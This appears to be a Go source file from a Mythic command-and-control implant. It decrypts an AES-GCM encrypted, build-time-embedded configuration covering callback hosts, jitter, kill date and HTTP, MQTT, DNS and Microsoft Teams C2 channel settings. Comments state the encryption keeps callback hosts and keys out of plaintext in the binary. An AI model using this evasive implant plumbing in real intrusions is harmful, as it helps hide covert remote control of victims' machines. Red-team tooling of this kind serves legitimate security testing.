package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"encoding/json"
	"fmt"
)

// Set at build time via -ldflags -X. Encrypted JSON Config, so callback
// hosts, URIs and keys never sit plaintext in the binary.
var (
	cfgBlob  string
	cfgKey   string
	cfgNonce string
	// includedCommands is the comma-separated command set the operator
	// selected for this payload. Empty means all commands (offline
	// builds that do not pass -X keep working).
	includedCommands string
)

// Config mirrors the Mythic http C2 profile parameters. Field names match
// the profile so container and CLI builders map 1:1.
type Config struct {
	PayloadUUID      string            `json:"payload_uuid"`
	CallbackHost     string            `json:"callback_host"`
	CallbackPort     int               `json:"callback_port"`
	CallbackInterval int               `json:"callback_interval"`
	CallbackJitter   int               `json:"callback_jitter"`
	PostURI          string            `json:"post_uri"`
	GetURI           string            `json:"get_uri"`
	QueryPathName    string            `json:"query_path_name"`
	Headers          map[string]string `json:"headers"`
	ProxyHost        string            `json:"proxy_host"`
	ProxyPort        string            `json:"proxy_port"`
	ProxyUser        string            `json:"proxy_user"`
	ProxyPass        string            `json:"proxy_pass"`
	Killdate         string            `json:"killdate"`
	Crypto           string            `json:"crypto"`
	PSK              string            `json:"psk"`
	Retries          int               `json:"retries"`
	TaskingSize      int               `json:"tasking_size"`
	Profile          string            `json:"profile"`
	// MQTT profile parameters.
	MqttServer    string `json:"mqtt_server"`
	MqttPort      string `json:"mqtt_port"`
	MqttUseSSL    string `json:"mqtt_use_ssl"`
	MqttClient    string `json:"mqtt_client"`
	MqttUser      string `json:"mqtt_user"`
	MqttPass      string `json:"mqtt_pass"`
	MqttTopic     string `json:"mqtt_topic"`
	MqttMythic    string `json:"mqtt_mythic"`
	MqttTaskcheck string `json:"mqtt_taskcheck"`
	// DNS profile parameters.
	Domains            []string `json:"domains"`
	DomainRotation     string   `json:"domain_rotation"`
	FailoverThreshold  int      `json:"failover_threshold"`
	DnsServer          string   `json:"dns_server"`
	RecordType         string   `json:"record_type"`
	MaxQueryLength     int      `json:"max_query_length"`
	MaxSubdomainLength int      `json:"max_subdomain_length"`
	// MS Teams profile parameters.
	TenantID     string `json:"tenant_id"`
	ClientID     string `json:"client_id"`
	ClientSecret string `json:"client_secret"`
	TeamID       string `json:"team_id"`
	ChannelID    string `json:"channel_id"`
	WebhookURL   string `json:"webhook_url"`
	UserAgent    string `json:"user_agent"`
}

// loadConfig decrypts the build-time blob into Config. Wire format matches
// Cryptor AES-GCM output: hex(AES-GCM(key, nonce, json)).
func loadConfig() (Config, error) {
	var c Config
	ct, err := hex.DecodeString(cfgBlob)
	if err != nil {
		return c, fmt.Errorf("config blob: %w", err)
	}
	key, err := hex.DecodeString(cfgKey)
	if err != nil {
		return c, fmt.Errorf("config key: %w", err)
	}
	nonce, err := hex.DecodeString(cfgNonce)
	if err != nil {
		return c, fmt.Errorf("config nonce: %w", err)
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return c, fmt.Errorf("config cipher: %w", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return c, fmt.Errorf("config gcm: %w", err)
	}
	pt, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		return c, fmt.Errorf("config open: %w", err)
	}
	if err := json.Unmarshal(pt, &c); err != nil {
		return c, fmt.Errorf("config json: %w", err)
	}
	return c, nil
}
